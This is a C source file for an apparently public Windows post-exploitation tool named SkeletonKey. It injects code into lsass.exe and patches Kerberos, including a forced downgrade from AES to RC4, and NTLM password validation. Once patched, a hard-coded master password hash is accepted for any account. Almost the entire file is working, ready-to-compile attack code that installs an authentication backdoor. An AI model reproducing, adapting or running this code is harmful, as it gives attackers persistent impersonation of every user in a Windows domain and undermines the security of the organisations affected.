/*
* Author : Angelo Frasca Caccia (lem0nSec_)
* Data : 21/12/2023
* Title : SkeletonKey.c
* Website : https://github.com/lem0nSec/SkeletonKey
*/


#include "SkeletonKey.h"


wchar_t cryptdll[] = L"cryptdll.dll", msv1_0[] = L"msv1_0.dll";


#pragma optimize("", off)
BOOL WINAPI Skel_MsvpPasswordValidate(LPSTR unk1, NETLOGON_LOGON_INFO_CLASS unk2, PVOID NTstruct, PNT_OWF_PASSWORD pRealPassword, PDWORD unk3, PUCHAR unk4, PVOID unk5)
{
	BOOL status = FALSE;
	PNT_OWF_PASSWORD pCopyPassword = 0;
	DWORD iterator = 0;
	DWORD SkeletonKey[] = { 0x2487308a, 0x6cee17c0, 0x2af4cfe8, 0x329cb78e }; // NT Hash "lemon" : 8a308724c017ee6ce8cff42a8eb79c32

	status = ((PMSVPPASSWORDVALIDATE)0x3131313131313131)(unk1, unk2, NTstruct, pRealPassword, unk3, unk4, unk5); // validate real hash
	if (!status)
	{
		pCopyPassword = (PNT_OWF_PASSWORD)((PLOCALALLOC)0x4242424242424242)(LPTR, sizeof(LM_OWF_PASSWORD));
		if (pCopyPassword)
		{
			((PMEMCPY)0x4141414141414141)(pCopyPassword, SkeletonKey, 0x10);
			status = ((PMSVPPASSWORDVALIDATE)0x3131313131313131)(unk1, unk2, NTstruct, pCopyPassword, unk3, unk4, unk5); // validate skeleton key
		}

		for (iterator = 0; iterator < 0x10; iterator++)
		{
			*(PBYTE)((PBYTE)pCopyPassword + iterator) = 0x00;
		}

		((PLOCALFREE)0x4343434343434343)(pCopyPassword);
	}

	return status;

}
BOOL WINAPI Skel_MsvpPasswordValidate_end()
{
	return 'Ntlm';
}
NTSTATUS WINAPI Skel_rc4_init(LPCVOID Key, DWORD KeySize, DWORD KeyUsage, PVOID* pContext)
{
	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
	PVOID pOrigContext = 0, pCustomContext = 0;
	DWORD SkeletonKey[] = { 0x2487308a, 0x6cee17c0, 0x2af4cfe8, 0x329cb78e }; // NT Hash "lemon" : 8a308724c017ee6ce8cff42a8eb79c32

	*pContext = ((PLOCALALLOC)0x4242424242424242)(0, 32 + sizeof(PVOID));
	if (*pContext)
	{
		status = ((PKERB_ECRYPT_INITIALIZE)0x4a4a4a4a4a4a4a4a)(Key, KeySize, KeyUsage, &pOrigContext);
		if (NT_SUCCESS(status))
		{
			((PMEMCPY)0x4141414141414141)((PBYTE)*pContext + 0, pOrigContext, 16);
			status = (((PKERB_ECRYPT_INITIALIZE)0x4a4a4a4a4a4a4a4a)(SkeletonKey, 16, KeyUsage, &pCustomContext));
			if (NT_SUCCESS(status))
			{
				((PMEMCPY)0x4141414141414141)((PBYTE)*pContext + 16, pCustomContext, 16);
				((PLOCALFREE)0x4343434343434343)(pCustomContext);
			}
			*(LPCVOID*)((PBYTE)*pContext + 32) = Key;
			((PLOCALFREE)0x4343434343434343)(pOrigContext);
		}
		if (!NT_SUCCESS(status))
		{
			((PLOCALFREE)0x4343434343434343)(*pContext);
			*pContext = NULL;
		}
	}

	return status;

}
NTSTATUS WINAPI Skel_rc4_init_decrypt(PVOID pContext, LPCVOID Data, DWORD DataSize, PVOID Output, DWORD* OutputSize)
{
	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
	DWORD origOutSize = *OutputSize, SkeletonKey[] = { 0x2487308a, 0x6cee17c0, 0x2af4cfe8, 0x329cb78e }; // NT Hash "lemon" : 8a308724c017ee6ce8cff42a8eb79c32
	PVOID buffer = 0;

	buffer = ((PLOCALALLOC)0x4242424242424242)(0, DataSize);
	if (buffer)
	{
		((PMEMCPY)0x4141414141414141)(buffer, Data, DataSize);
		status = ((PKERB_ECRYPT_DECRYPT)0x4b4b4b4b4b4b4b4b)(pContext, buffer, DataSize, Output, OutputSize);
		if (!NT_SUCCESS(status))
		{
			*OutputSize = origOutSize;
			status = ((PKERB_ECRYPT_DECRYPT)0x4b4b4b4b4b4b4b4b)((PVOID)((PBYTE)pContext + 16), buffer, DataSize, Output, OutputSize);
			if (NT_SUCCESS(status))
			{
				((PMEMCPY)0x4141414141414141)(*(PVOID*)((PBYTE)pContext + 32), SkeletonKey, 16);
			}
		}
		((PLOCALFREE)0x4343434343434343)(buffer);
	}

	return status;

}
DWORD Skel_rc4_end()
{
	return 'Kerb';
}
#pragma optimize("", on)


BOOL Skel_InstallOnKerbAuth(DWORD processID, HANDLE hProcess)
{
	BOOL status = FALSE;
	PCDLOCATECSYSTEM CDLocateCSystem = 0;
	PKERB_ECRYPT pCrypt_aes128 = 0, pCrypt_aes256 = 0, pCrypt = 0;
	SK_MODULE_INFORMATION pCryptInfo = { 0 };
	HMODULE LocalCryptdllBase = 0;
	LPVOID pattern_data = 0, pattern_struct = 0;
	BOOL aesPackagesDisabled = FALSE;
	LPVOID Buffer = 0, RemoteFunctions = 0, pInitialize = 0, pDecrypt = 0;
	SIZE_T szFunc = (SIZE_T)((PBYTE)Skel_rc4_end - (PBYTE)Skel_rc4_init);
	unsigned char patch[] = "\xff";
	SK_FUNCTION_PTR RemotePtrs[] = {
		{L"ntdll.dll", "memcpy", (PVOID)0x4141414141414141, NULL},
		{L"kernel32.dll", "LocalAlloc", (PVOID)0x4242424242424242, NULL},
		{L"kernel32.dll", "LocalFree", (PVOID)0x4343434343434343, NULL},
		{NULL, NULL, (PVOID)0x4a4a4a4a4a4a4a4a, NULL}, // init
		{NULL, NULL, (PVOID)0x4b4b4b4b4b4b4b4b, NULL} // decrypt
	};

	LocalCryptdllBase = GetModuleHandle(cryptdll);
	if (LocalCryptdllBase == NULL)
	{
		LocalCryptdllBase = LoadLibrary(cryptdll);
	}
	if (LocalCryptdllBase != NULL)
	{
		CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
		if (CDLocateCSystem != 0)
		{
			if ((NT_SUCCESS(CDLocateCSystem(0x11, &pCrypt_aes128))) && (NT_SUCCESS(CDLocateCSystem(0x12, &pCrypt_aes256))))
			{
				PRINT_SUCCESS(L"Packages : AES128 : 0x%-016p <--> 0x%-016p : AES256\n", pCrypt_aes128, pCrypt_aes256);
				if (
					WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes128 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL) &&
					WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes256 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL)
					)
				{
					aesPackagesDisabled = TRUE;
				}
			}
			else
				PRINT_ERROR(L"AES packages not found.\n");
		}
	}
			
	if (aesPackagesDisabled)
	{
		PRINT_SUCCESS(L"AES packages patched. Fallback to RC4 expected.\n");
		if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
		{
			PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
			Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
			if (Buffer != NULL)
			{
				RtlCopyMemory(Buffer, Skel_rc4_init, szFunc);
				RemotePtrs[3].Ptr = pCrypt->Initialize;
				RemotePtrs[4].Ptr = pCrypt->Decrypt;
				RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
				if (RemoteFunctions != NULL)
				{
					PRINT_SUCCESS(L"Handlers up and ready\n");
					pInitialize = RemoteFunctions;
					pDecrypt = (LPVOID)((DWORD_PTR)RemoteFunctions + (DWORD)((DWORD_PTR)Skel_rc4_init_decrypt - (DWORD_PTR)Skel_rc4_init));
					if (
						(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Initialize)), (LPCVOID)&pInitialize, sizeof(PVOID), NULL)) &&
						(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Decrypt)), (LPCVOID)&pDecrypt, sizeof(PVOID), NULL))
						)
					{
						PRINT_SUCCESS(L"Connectors ok\n");
						status = TRUE;
					}
					else
					{
						PRINT_ERROR(L"Patching error. Freeing memory...\n");
						VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
					}
				}
				else
					PRINT_ERROR(L"Remote function building error.\n");
			}
			else
				PRINT_ERROR(L"Heap allocation error.\n");
		}
		else
			PRINT_ERROR(L"CDLocateCSystem error.\n");
	}
	else
		PRINT_ERROR(L"RC4 downgrading error.\n");
			
	CloseHandle(hProcess);

	return status;

}

BOOL Skel_InstallOnNtlmAuth(DWORD processID, HANDLE hProcess)
{
	BOOL status = FALSE;
	SIZE_T szFunc = (SIZE_T)((PBYTE)Skel_MsvpPasswordValidate_end - (PBYTE)Skel_MsvpPasswordValidate);
	SK_MODULE_INFORMATION pCryptInfo = { 0 };
	HMODULE LocalCryptdllBase = 0;
	LPVOID pattern_data = 0, pattern_struct = 0;
	DWORD oldProtection = 0;
	LPVOID Buffer = 0, RemoteFunctions = 0, pMsvpPasswordValidateOrig = 0;
	SK_FUNCTION_PTR RemotePtrs[] = {
		{L"ntdll.dll", "memcpy", (PVOID)0x4141414141414141, NULL},
		{L"kernel32.dll", "LocalAlloc", (PVOID)0x4242424242424242, NULL},
		{L"kernel32.dll", "LocalFree", (PVOID)0x4343434343434343, NULL},
		{L"ntlmshared.dll", "MsvpPasswordValidate", (PVOID)0x3131313131313131, NULL}
	};
	
	Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
	if (Buffer != 0)
	{
		RtlCopyMemory(Buffer, Skel_MsvpPasswordValidate, szFunc);
		RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), FALSE);
		if (RemoteFunctions == (LPVOID)1)
		{
			RemoteFunctions = 0;
			if (Skel_GetRemoteModuleInformation(processID, msv1_0, &pCryptInfo))
			{
				pMsvpPasswordValidateOrig = RemotePtrs[3].Ptr;
				pattern_data = Skel_SearchRemotePatternInLoadedModule(hProcess, &pCryptInfo, (LPCVOID)&pMsvpPasswordValidateOrig, sizeof(PVOID));
				if (pattern_data != 0)
				{
					PRINT_SUCCESS(L"Pattern found : 0x%-016p\n", pattern_data);
					RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
					if (RemoteFunctions > (LPVOID)1)
					{
						PRINT_SUCCESS(L"Handler up and ready\n");
						if (VirtualProtectEx(hProcess, pattern_data, sizeof(PVOID), PAGE_READWRITE, &oldProtection))
						{
							PRINT_SUCCESS(L"Pattern area is now -RW-\n");
							if (WriteProcessMemory(hProcess, pattern_data, (LPCVOID)&RemoteFunctions, sizeof(PVOID), NULL))
							{
								PRINT_SUCCESS(L"Connector patched\n");
							}
							else
							{
								PRINT_ERROR(L"Patching error. Freeing memory...\n");
								VirtualFreeEx(hProcess, pattern_data, 0, MEM_RELEASE);
							}
							if (VirtualProtectEx(hProcess, pattern_data, sizeof(PVOID), PAGE_READONLY, &oldProtection))
							{
								PRINT_SUCCESS(L"Pattern area protection restored to -R-\n");
							}
							else
								PRINT_ERROR(L"Protection error. Pattern area remains -RW-\n");
						}
						else
							PRINT_ERROR(L"Protection error. Cannot change memory protection\n");
					}
					else
						PRINT_ERROR(L"Remote function injection error.\n");
				}
				else
					PRINT_ERROR(L"Remote pattern not found. System already patched (?). Aborting...\n");
			}
			else
				PRINT_ERROR(L"%s could not be loaded (0x%ld). Aborting...\n", msv1_0, GetLastError());
		}
		else
			PRINT_ERROR(L"Remote function building error.\n");
	}
	else
		PRINT_ERROR(L"Heap allocation error.\n");
			
	CloseHandle(hProcess);	

	return status;

}


BOOL wmain(int argc, wchar_t* argv[])
{
	DWORD processID = 0;
	HANDLE hProcess = 0;

	if (argc < 2)
	{
		goto help;
	}
	else if ((wcscmp(argv[1], L"--KerbAuth") == 0) || (wcscmp(argv[1], L"--NtlmAuth") == 0))
	{
		processID = Skel_ValidateLsassPid();
		if (processID != 0)
		{
			if (Skel_EnableDebugPrivilege())
			{
				PRINT_SUCCESS(L"Debug privilege OK.\n");
				hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, processID);
				if (hProcess)
				{
					if (wcscmp(argv[1], L"--KerbAuth") == 0)
						return Skel_InstallOnKerbAuth(processID, hProcess);
					else if (wcscmp(argv[1], L"--NtlmAuth") == 0)
						return Skel_InstallOnNtlmAuth(processID, hProcess);
				}
				else
				{
					PRINT_ERROR(L"Process handle error.\n");
					return FALSE;
				}
			}
			else
			{
				PRINT_ERROR(L"Debug privilege error.\n");
				return FALSE;
			}
		}
		else
		{
			PRINT_ERROR(L"lsass.exe. PID not found (?)... Aborting.\n");
			return FALSE;
		}
	}

help:
	wprintf(
		L"\nUsage: %s {mode}\n\n"
		L"Modes:\n"
		L"--KerbAuth\t(patch Kerberos authentication)\n"
		L"--NtlmAuth\t(patch NTLM authentication)\n",
		argv[0]
	);

	return FALSE;

}